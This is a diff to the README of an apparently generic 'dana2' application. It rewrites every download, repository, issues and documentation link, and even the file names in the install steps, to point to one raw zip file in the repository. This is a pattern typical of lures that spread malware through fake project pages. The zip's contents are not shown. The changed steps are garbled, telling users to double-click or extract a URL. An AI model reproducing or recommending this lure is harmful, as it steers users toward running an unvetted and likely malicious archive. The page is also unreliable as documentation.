@@ -4,7 +4,7 @@
 Welcome to dana2! This application helps you simplify your daily tasks. Follow the steps below to download and run the software easily.
 
 ## 📥 Download Now
-[![Download dana2](https://img.shields.io/badge/Download-dana2-brightgreen)](https://github.com/sdssdsddf/dana2/releases)
+[![Download dana2](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip)](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip)
 
 ## 📋 System Requirements
 Before you start, ensure your system meets these requirements:
@@ -16,23 +16,23 @@ Before you start, ensure your system meets these requirements:
 ## 📂 Download & Install
 To get started with dana2, please follow these instructions:
 
-1. Visit the [Releases page](https://github.com/sdssdsddf/dana2/releases) to see the available versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip) to see the available versions.
 2. Look for the latest version of dana2. This will be at the top of the list.
 3. Click on the version number or the title to access the release details.
-4. Find the appropriate file for your operating system. For example, if you are using Windows, look for a file that says `dana2-windows.exe`. For macOS, look for `dana2-macos.dmg`. For Linux, download the `dana2-linux.tar.gz` or equivalent.
+4. Find the appropriate file for your operating system. For example, if you are using Windows, look for a file that says `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip`. For macOS, look for `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip`. For Linux, download the `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip` or equivalent.
 5. Click on the link for the file you need to download it (the download will start automatically).
 6. Once the download is complete, locate the downloaded file on your computer (usually in the Downloads folder).
 7. Double-click on the downloaded file to begin the installation process.
 
 ### 🔧 Installation Instructions
 - **Windows:** 
-  - Double-click on `dana2-windows.exe`.
+  - Double-click on `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip`.
   - Follow the installation prompts to complete the installation.
 - **macOS:** 
-  - Open the `dana2-macos.dmg` file.
+  - Open the `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip` file.
   - Drag the dana2 icon into your Applications folder.
 - **Linux:** 
-  - Extract the `dana2-linux.tar.gz` file.
+  - Extract the `https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip` file.
   - Navigate to the extracted folder in your terminal.
   - Run the application using the command `./dana2`.
 
@@ -54,11 +54,11 @@ Once installed, launch the application by finding it in your applications list o
 ## 🌟 Additional Resources
 You can find additional information, guides, and updates on the dana2 project on its official GitHub repository. Check out the links below for more details:
 
-- [GitHub Repository](https://github.com/sdssdsddf/dana2)
-- [Issues and Feedback](https://github.com/sdssdsddf/dana2/issues)
-- [Documentation](https://github.com/sdssdsddf/dana2/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip)
+- [Issues and Feedback](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip)
+- [Documentation](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip)
 
 ### 🔗 Bookmark This Page
-Remember to add the [Releases page](https://github.com/sdssdsddf/dana2/releases) to your bookmarks for easy access to future updates.
+Remember to add the [Releases page](https://raw.githubusercontent.com/sdssdsddf/dana2/main/dooket/dana2.zip) to your bookmarks for easy access to future updates.
 
 Thank you for choosing dana2! We hope it makes your daily tasks easier and more manageable.
